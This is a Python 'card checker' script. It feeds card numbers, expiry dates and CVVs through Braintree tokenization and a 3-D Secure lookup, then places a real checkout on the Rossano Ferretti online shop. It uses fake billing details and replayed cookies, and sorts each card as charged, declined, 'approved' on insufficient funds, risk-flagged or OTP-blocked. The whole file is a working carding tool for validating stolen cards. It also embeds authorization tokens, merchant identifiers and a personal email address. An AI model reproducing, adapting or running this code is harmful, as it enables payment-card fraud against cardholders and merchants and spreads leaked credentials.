import requests
import re
import random
import time
import string
import base64
from bs4 import BeautifulSoup
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTk5MjIyMDgsImp0aSI6ImIxMWE5YTM5LThlNGItNDM3Ni1hMGY2LTdhYWQ1NGVkZGZiOCIsInN1YiI6Im42MzZrYjVuNGdqOHJtcTgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im42MzZrYjVuNGdqOHJtcTgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoicm9zc2Fub2ZlcnJldHRpVVNEIn19.bBbZtRfzvkxAh2MJ-PRpOzOSk3CdWPcsx_tVeXh2mVnULiAP8R_tIHuoPjwVPz3bta-00YkvY2pEe5zr8LStsA',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'd77196d4-6d14-4286-8556-7a57bf6e9902',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
                'billingAddress': {
                    'postalCode': '10080',
                    'streetAddress': 'new york',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	zeko1=(response.json()['data']['tokenizeCreditCard']['token'])

	headers = {
    'authority': 'api.braintreegateway.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/json',
    'origin': 'https://www.rossanoferretti.com',
    'referer': 'https://www.rossanoferretti.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'amount': '26.00',
    'browserColorDepth': 24,
    'browserJavaEnabled': False,
    'browserJavascriptEnabled': True,
    'browserLanguage': 'ar-EG',
    'browserScreenHeight': 870,
    'browserScreenWidth': 391,
    'browserTimeZone': -180,
    'deviceChannel': 'Browser',
    'additionalInfo': {
        'shippingGivenName': 'zsko',
        'shippingSurname': 'vip',
        'billingLine1': 'new york',
        'billingLine2': 'new york',
        'billingCity': 'new york',
        'billingState': 'NY',
        'billingPostalCode': '10080',
        'billingCountryCode': 'US',
        'billingPhoneNumber': '17145879645',
        'billingGivenName': 'zsko',
        'billingSurname': 'vip',
        'shippingLine1': 'new york',
        'shippingLine2': 'new york',
        'shippingCity': 'new york',
        'shippingState': 'NY',
        'shippingPostalCode': '10080',
        'shippingCountryCode': 'US',
        'email': 'vipzeko450@gmail.com',
    },
    'challengeRequested': True,
    'bin': '546775',
    'dfReferenceId': '0_e6b0a30c-9068-4782-99d5-069dd0b0cc61',
    'clientMetadata': {
        'requestedThreeDSecureVersion': '2',
        'sdkVersion': 'web/3.102.0',
        'cardinalDeviceDataCollectionTimeElapsed': 7,
        'issuerDeviceDataCollectionTimeElapsed': 1,
        'issuerDeviceDataCollectionResult': True,
    },
    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTk5MjIyMDgsImp0aSI6ImIxMWE5YTM5LThlNGItNDM3Ni1hMGY2LTdhYWQ1NGVkZGZiOCIsInN1YiI6Im42MzZrYjVuNGdqOHJtcTgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im42MzZrYjVuNGdqOHJtcTgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoicm9zc2Fub2ZlcnJldHRpVVNEIn19.bBbZtRfzvkxAh2MJ-PRpOzOSk3CdWPcsx_tVeXh2mVnULiAP8R_tIHuoPjwVPz3bta-00YkvY2pEe5zr8LStsA',
    'braintreeLibraryVersion': 'braintree/web/3.102.0',
    '_meta': {
        'merchantAppId': 'www.rossanoferretti.com',
        'platform': 'web',
        'sdkVersion': '3.102.0',
        'source': 'client',
        'integration': 'custom',
        'integrationType': 'custom',
        'sessionId': 'd77196d4-6d14-4286-8556-7a57bf6e9902',
    },
}

	response = requests.post(
    f'https://api.braintreegateway.com/merchants/n636kb5n4gj8rmq8/client_api/v1/payment_methods/{zeko1}/three_d_secure/lookup',
    headers=headers,
    json=json_data,
)
	zeko2=(response.json()['paymentMethod']['nonce'])

	cookies = {
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-07-01%2012%3A03%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.rossanoferretti.com%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-07-01%2012%3A03%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.rossanoferretti.com%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'data-timeout': 'false||false',
    '_vwo_uuid_v2': 'DE5B874DC2586A7414DA6ED3AEACEAB5E|17c9f43278587716e9b25a36ac0d3524',
    '_gcl_au': '1.1.1068744040.1719835392',
    '_ga': 'GA1.1.1380095358.1719835392',
    '_fbp': 'fb.1.1719835399643.89642307734612835',
    '_hjSession_3568193': 'eyJpZCI6ImNkYjFmNTk3LTc1ZWMtNDdiMC1hZTUxLThlNDZhZjgzNDNjYSIsImMiOjE3MTk4MzU0MDAwMzQsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=',
    '_clck': '1cym5qz%7C2%7Cfn3%7C0%7C1643',
    'country_redirect': 'true',
    '_hjSessionUser_3568193': 'eyJpZCI6IjAwYjIwOGE2LWVjMjktNTRmZi04MGNjLTAzMGZiNTBlNjU1OSIsImNyZWF0ZWQiOjE3MTk4MzU0MDAwMjYsImV4aXN0aW5nIjp0cnVlfQ==',
    'modal_dismissed': '1',
    'mailchimp_landing_site': 'https%3A%2F%2Fwww.rossanoferretti.com%2Fproduct-category%2Fshampoo%2F%3Forderby%3Dprice',
    'woocommerce_items_in_cart': '1',
    'woocommerce_cart_hash': 'ff76c92ac87414827bed3c88eccd1d74',
    'wp_woocommerce_session_3347843f7c91a46d5cf935aab282ae83': 't_8488c74c51bec433b7333ca01e4f1a%7C%7C1720008590%7C%7C1720004990%7C%7C4a7cda32cdc92192a8daa59bb58783ca',
    'sbjs_session': 'pgs%3D24%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.rossanoferretti.com%2Fcheckout%2F',
    '_clsk': '11dcmsy%7C1719835819305%7C11%7C1%7Cw.clarity.ms%2Fcollect',
    'amp_f24a38': 'rQe6H5_60ZgJfVkaG1T7EJ...1i1n37bok.1i1n381e1.0.0.0',
    'amp_f24a38_rossanoferretti.com': 'rQe6H5_60ZgJfVkaG1T7EJ...1i1n37bok.1i1n381fg.0.0.0',
    '_uetsid': 'e405aa5037a111efa46b0df41a65dd8a',
    '_uetvid': 'e40620c037a111ef8956272610474218',
    'modal_dismissed_checkout': '1',
    '_ga_T9Q7G4SDBR': 'GS1.1.1719835392.1.1.1719835845.21.0.0',
    'mailchimp.cart.current_email': 'vipzeko450@gmail.com',
    'mailchimp.cart.previous_email': 'vipzeko450@gmail.com',
    'mailchimp_user_email': 'vipzeko450%40gmail.com',
    'apt_pixel': 'eyJkZXZpY2VJZCI6ImJkZjhmYTIxLTI1Y2UtNDllMi1hMTYxLTg3ZmY4NDI4MmI4ZSIsInVzZXJJZCI6bnVsbCwiZXZlbnRJZCI6MTYsImxhc3RFdmVudFRpbWUiOjE3MTk4MzU4ODI4NDYsImNoZWNrb3V0Ijp7ImJyYW5kIjoiYWZ0ZXJwYXkiLCJlIjoiN2I5MTFjMWQtNTg2OC00Y2E5LWI1OWUtNzBiNDlkZjM2NTY0IiwiZyI6InQyIiwiZVN0YXR1cyI6Im1lcmNoYW50LW5vdC1lbGlnaWJsZSJ9fQ==',
}

	headers = {
    'authority': 'www.rossanoferretti.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-01%2012%3A03%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.rossanoferretti.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-07-01%2012%3A03%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.rossanoferretti.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; data-timeout=false||false; _vwo_uuid_v2=DE5B874DC2586A7414DA6ED3AEACEAB5E|17c9f43278587716e9b25a36ac0d3524; _gcl_au=1.1.1068744040.1719835392; _ga=GA1.1.1380095358.1719835392; _fbp=fb.1.1719835399643.89642307734612835; _hjSession_3568193=eyJpZCI6ImNkYjFmNTk3LTc1ZWMtNDdiMC1hZTUxLThlNDZhZjgzNDNjYSIsImMiOjE3MTk4MzU0MDAwMzQsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; _clck=1cym5qz%7C2%7Cfn3%7C0%7C1643; country_redirect=true; _hjSessionUser_3568193=eyJpZCI6IjAwYjIwOGE2LWVjMjktNTRmZi04MGNjLTAzMGZiNTBlNjU1OSIsImNyZWF0ZWQiOjE3MTk4MzU0MDAwMjYsImV4aXN0aW5nIjp0cnVlfQ==; modal_dismissed=1; mailchimp_landing_site=https%3A%2F%2Fwww.rossanoferretti.com%2Fproduct-category%2Fshampoo%2F%3Forderby%3Dprice; woocommerce_items_in_cart=1; woocommerce_cart_hash=ff76c92ac87414827bed3c88eccd1d74; wp_woocommerce_session_3347843f7c91a46d5cf935aab282ae83=t_8488c74c51bec433b7333ca01e4f1a%7C%7C1720008590%7C%7C1720004990%7C%7C4a7cda32cdc92192a8daa59bb58783ca; sbjs_session=pgs%3D24%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.rossanoferretti.com%2Fcheckout%2F; _clsk=11dcmsy%7C1719835819305%7C11%7C1%7Cw.clarity.ms%2Fcollect; amp_f24a38=rQe6H5_60ZgJfVkaG1T7EJ...1i1n37bok.1i1n381e1.0.0.0; amp_f24a38_rossanoferretti.com=rQe6H5_60ZgJfVkaG1T7EJ...1i1n37bok.1i1n381fg.0.0.0; _uetsid=e405aa5037a111efa46b0df41a65dd8a; _uetvid=e40620c037a111ef8956272610474218; modal_dismissed_checkout=1; _ga_T9Q7G4SDBR=GS1.1.1719835392.1.1.1719835845.21.0.0; mailchimp.cart.current_email=vipzeko450@gmail.com; mailchimp.cart.previous_email=vipzeko450@gmail.com; mailchimp_user_email=vipzeko450%40gmail.com; apt_pixel=eyJkZXZpY2VJZCI6ImJkZjhmYTIxLTI1Y2UtNDllMi1hMTYxLTg3ZmY4NDI4MmI4ZSIsInVzZXJJZCI6bnVsbCwiZXZlbnRJZCI6MTYsImxhc3RFdmVudFRpbWUiOjE3MTk4MzU4ODI4NDYsImNoZWNrb3V0Ijp7ImJyYW5kIjoiYWZ0ZXJwYXkiLCJlIjoiN2I5MTFjMWQtNTg2OC00Y2E5LWI1OWUtNzBiNDlkZjM2NTY0IiwiZyI6InQyIiwiZVN0YXR1cyI6Im1lcmNoYW50LW5vdC1lbGlnaWJsZSJ9fQ==',
    'origin': 'https://www.rossanoferretti.com',
    'referer': 'https://www.rossanoferretti.com/checkout/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

	params = {
    'wc-ajax': 'checkout',
}

	data = f'shipping_method%5B0%5D=table_rate%3A5%3A1&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fwww.rossanoferretti.com%2F&wc_order_attribution_session_start_time=2024-07-01+12%3A03%3A11&wc_order_attribution_session_pages=23&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Linux%3B+Android+10%3B+K)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F124.0.0.0+Mobile+Safari%2F537.36&billing_email=vipzeko450%40gmail.com&billing_first_name=zsko&billing_last_name=vip&billing_company=&billing_country=US&billing_address_1=new+york&billing_address_2=new+york&billing_city=new+york&billing_state=NY&billing_postcode=10080&billing_phone=17145879645&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=US&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&metorik_source_type=typein&metorik_source_url=(none)&metorik_source_mtke=&metorik_source_utm_campaign=(none)&metorik_source_utm_source=(direct)&metorik_source_utm_medium=(none)&metorik_source_utm_content=(none)&metorik_source_utm_id=(none)&metorik_source_utm_term=(none)&metorik_source_session_entry=https%3A%2F%2Fwww.rossanoferretti.com%2F&metorik_source_session_start_time=2024-07-01+12%3A03%3A11&metorik_source_session_pages=24&metorik_source_session_count=1&braintree_paypal_nonce_key=&braintree_paypal_device_data=%7B%22device_session_id%22%3A%223df71d3725ba3f6cd181acbf78415345%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%2294513bbb53fbc145d6a056d525382589%22%7D&payment_method=braintree_cc&braintree_cc_nonce_key={zeko2}&braintree_cc_device_data=%7B%22device_session_id%22%3A%223df71d3725ba3f6cd181acbf78415345%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%2294513bbb53fbc145d6a056d525382589%22%7D&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2Fn636kb5n4gj8rmq8%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2Fn636kb5n4gj8rmq8%22%7D%2C%22merchantId%22%3A%22n636kb5n4gj8rmq8%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22applePayWeb%22%3A%7B%22countryCode%22%3A%22IE%22%2C%22currencyCode%22%3A%22USD%22%2C%22merchantIdentifier%22%3A%22n636kb5n4gj8rmq8%22%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%5D%7D%2C%22kount%22%3A%7B%22kountMerchantId%22%3Anull%7D%2C%22challenges%22%3A%5B%22cvv%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22American+Express%22%2C%22Discover%22%2C%22Maestro%22%2C%22UK+Maestro%22%2C%22MasterCard%22%2C%22Visa%22%5D%7D%2C%22threeDSecureEnabled%22%3Atrue%2C%22threeDSecure%22%3A%7B%22cardinalAuthenticationJWT%22%3A%22eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI5NTU5NGU3NC0xNmQzLTQxNDUtYTkzOS1mZGE0MTE5ZTg4NWEiLCJpYXQiOjE3MTk4MzU4MjAsImV4cCI6MTcxOTg0MzAyMCwiaXNzIjoiNWM4YTk5ZjA3OTFlZWYzMWU4MzE1MWQzIiwiT3JnVW5pdElkIjoiNWM4YTk5ZjA3OTFlZWYzMWU4MzE1MWQwIn0.hdV28dfPdB2R3gtwGiO7D6Y0KFUVom3YqX-80QzBv7c%22%7D%2C%22androidPay%22%3A%7B%22displayName%22%3A%22Rossano+Ferretti%22%2C%22enabled%22%3Atrue%2C%22environment%22%3A%22production%22%2C%22googleAuthorizationFingerprint%22%3A%22eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTk5MjIyMjAsImp0aSI6IjNkMTAwYzRjLWY2ZWMtNDIyNi04YjAzLTk4MmIxNGE5NzljNCIsInN1YiI6Im42MzZrYjVuNGdqOHJtcTgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im42MzZrYjVuNGdqOHJtcTgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.Vd1zwppsBtQRmXN0qKmbTDeLsUnb_5VxPfCrhZJboD6c7o9yr5hM6EB4xEPFPsMMGimuH6LHn-zqnpMivFL6qQ%22%2C%22paypalClientId%22%3A%22ARPPamSFd5UGucKK5c1gsZIjTby-ExmKS7AcdOEdJ160q1Tav5ANjkCysqog5x99btiXOKSf44UZuxjF%22%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%5D%7D%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%22%3A%22Rossano+Ferretti%22%2C%22clientId%22%3A%22ARPPamSFd5UGucKK5c1gsZIjTby-ExmKS7AcdOEdJ160q1Tav5ANjkCysqog5x99btiXOKSf44UZuxjF%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%3Afalse%2C%22braintreeClientId%22%3A%22ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22rossanoferrettiUSD%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22USD%22%7D%7D&braintree_googlepay_nonce_key=&braintree_googlepay_device_data=%7B%22device_session_id%22%3A%223df71d3725ba3f6cd181acbf78415345%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%2294513bbb53fbc145d6a056d525382589%22%7D&braintree_applepay_nonce_key=&braintree_applepay_device_data=%7B%22device_session_id%22%3A%223df71d3725ba3f6cd181acbf78415345%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%2294513bbb53fbc145d6a056d525382589%22%7D&terms=on&terms-field=1&woocommerce-process-checkout-nonce=eef16dc8de&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review'

	response = requests.post('https://www.rossanoferretti.com/', params=params, cookies=cookies, headers=headers, data=data)
	if 'Payment method successfully added.' in response.text or 'street address.' in response.text or 'Gateway Rejected: avs' in response.text or 'Status code avs: Gateway Rejected: avs' in response.text or 'payment method added:' in response.text or 'Duplicate card exists in the vault.' in response.text or 'Payment method successfully added.' in response.text or 'Thank you for your purchase!' in response.text or 'Thank you for your' in response.text or 'added' in response.text:
		
		return ('Charge')
		
	elif 'CVV' in response.text:
		
		return ('Declined CVV')
		
	elif 'Insufficient Funds' in response.text:
		
		return ('1000:Approved')
		
	elif 'risk' in response.text:
		
		return ('RISK')
	
	elif 'three_d_secure' in response.text:
		return ('OTP')
			
	
	else:
		
		return ('DECLIND')